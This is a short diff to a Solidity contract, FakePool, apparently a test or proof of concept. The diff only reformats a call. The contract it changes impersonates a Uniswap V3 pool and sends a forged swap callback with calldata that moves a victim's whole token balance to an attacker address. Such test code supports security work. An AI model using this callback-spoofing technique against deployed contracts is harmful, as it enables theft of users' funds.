@@ -51,7 +51,9 @@ contract FakePool {
         bytes memory stealFunds = CalldataLib.encodeTransferIn(TOKEN, attacker, IERC20All(TOKEN).balanceOf(VICTIM));
 
         IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(
-            int256(99), int256(99), abi.encodePacked(VICTIM, TOKEN, TOKEN_OUT, uint8(0), uint16(500), uint16(stealFunds.length), stealFunds)
+            int256(99),
+            int256(99),
+            abi.encodePacked(VICTIM, TOKEN, TOKEN_OUT, uint8(0), uint16(500), uint16(stealFunds.length), stealFunds)
         );
     }
 }
